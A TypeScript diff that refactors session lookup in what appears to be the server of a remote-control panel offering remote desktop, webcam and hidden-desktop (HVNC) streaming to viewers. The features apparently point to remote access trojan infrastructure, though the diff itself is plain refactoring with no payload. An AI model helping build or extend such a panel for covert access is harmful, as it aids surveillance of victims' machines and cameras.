@@ -94,8 +94,7 @@ export function notifyRdInputLatency(commandId: string) {
   rdInputPending.delete(commandId);
 
   const ms = Date.now() - pending.sentAt;
-  for (const session of sessionManager.getAllRdSessions().values()) {
-    if (session.clientId !== pending.clientId) continue;
+  for (const session of sessionManager.getRdSessionsForClient(pending.clientId)) {
     safeSendViewer(session.viewer, { type: "input_latency", ms, kind: pending.kind, commandId });
   }
 }
@@ -188,7 +187,7 @@ export function handleRemoteDesktopViewerOpen(ws: ServerWebSocket<SocketData>) {
   const sessionId = uuidv4();
   const target = clientManager.getClient(clientId);
   const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
-  sessionManager.getAllRdSessions().set(sessionId, session);
+  sessionManager.addRdSession(session);
   safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
   if (!target) {
     safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
@@ -198,8 +197,7 @@ export function handleRemoteDesktopViewerOpen(ws: ServerWebSocket<SocketData>) {
 }
 
 export function notifyRemoteDesktopStatus(clientId: string, status: string, reason?: string) {
-  for (const session of sessionManager.getAllRdSessions().values()) {
-    if (session.clientId !== clientId) continue;
+  for (const session of sessionManager.getRdSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
       type: "status",
       status,
@@ -357,8 +355,7 @@ function handleRemoteDesktopFrame(payload: any) {
   if (!state.isStreaming) {
     rdStreamingState.set(clientId, { ...state, isStreaming: true });
   }
-  for (const session of sessionManager.getAllRdSessions().values()) {
-    if (session.clientId !== clientId) continue;
+  for (const session of sessionManager.getRdSessionsForClient(clientId)) {
     const sentBytes = safeSendViewerFrame(session.viewer, bytes, header);
     const t1 = typeof performance !== "undefined" && performance.now ? performance.now() : Date.now();
     rdSendStats.frames += 1;
@@ -371,8 +368,7 @@ function handleRemoteDesktopFrame(payload: any) {
 (globalThis as any).__rdBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
   let sent = false;
   const t0 = typeof performance !== "undefined" && performance.now ? performance.now() : Date.now();
-  for (const session of sessionManager.getAllRdSessions().values()) {
-    if (session.clientId !== clientId) continue;
+  for (const session of sessionManager.getRdSessionsForClient(clientId)) {
     const sentBytes = safeSendViewerFrame(session.viewer, bytes, header);
     const t1 = typeof performance !== "undefined" && performance.now ? performance.now() : Date.now();
     rdSendStats.frames += 1;
@@ -392,7 +388,7 @@ export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
   const sessionId = uuidv4();
   const target = clientManager.getClient(clientId);
   const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
-  sessionManager.getAllWebcamSessions().set(sessionId, session);
+  sessionManager.addWebcamSession(session);
   safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
   if (!target) {
     safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
@@ -403,8 +399,7 @@ export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
 }
 
 export function handleWebcamDevices(clientId: string, payload: any) {
-  for (const session of sessionManager.getAllWebcamSessions().values()) {
-    if (session.clientId !== clientId) continue;
+  for (const session of sessionManager.getWebcamSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, payload);
   }
 }
@@ -471,7 +466,7 @@ export function handleHVNCViewerOpen(ws: ServerWebSocket<SocketData>) {
   const sessionId = uuidv4();
   const target = clientManager.getClient(clientId);
   const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
-  sessionManager.getAllHvncSessions().set(sessionId, session);
+  sessionManager.addHvncSession(session);
   safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
   if (!target) {
     safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
@@ -481,8 +476,7 @@ export function handleHVNCViewerOpen(ws: ServerWebSocket<SocketData>) {
 }
 
 function notifyHVNCStatus(clientId: string, status: string, reason?: string) {
-  for (const session of sessionManager.getAllHvncSessions().values()) {
-    if (session.clientId !== clientId) continue;
+  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
       type: "status",
       status,
@@ -598,8 +592,7 @@ export function sendHVNCCommand(target: ClientInfo, commandType: string, payload
 
 (globalThis as any).__hvncBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
   let sent = false;
-  for (const session of sessionManager.getAllHvncSessions().values()) {
-    if (session.clientId !== clientId) continue;
+  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
     safeSendViewerFrame(session.viewer, bytes, header);
     sent = true;
   }
@@ -608,8 +601,7 @@ export function sendHVNCCommand(target: ClientInfo, commandType: string, payload
 
 (globalThis as any).__webcamBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
   let sent = false;
-  for (const session of sessionManager.getAllWebcamSessions().values()) {
-    if (session.clientId !== clientId) continue;
+  for (const session of sessionManager.getWebcamSessionsForClient(clientId)) {
     safeSendViewerFrame(session.viewer, bytes, header);
     sent = true;
   }
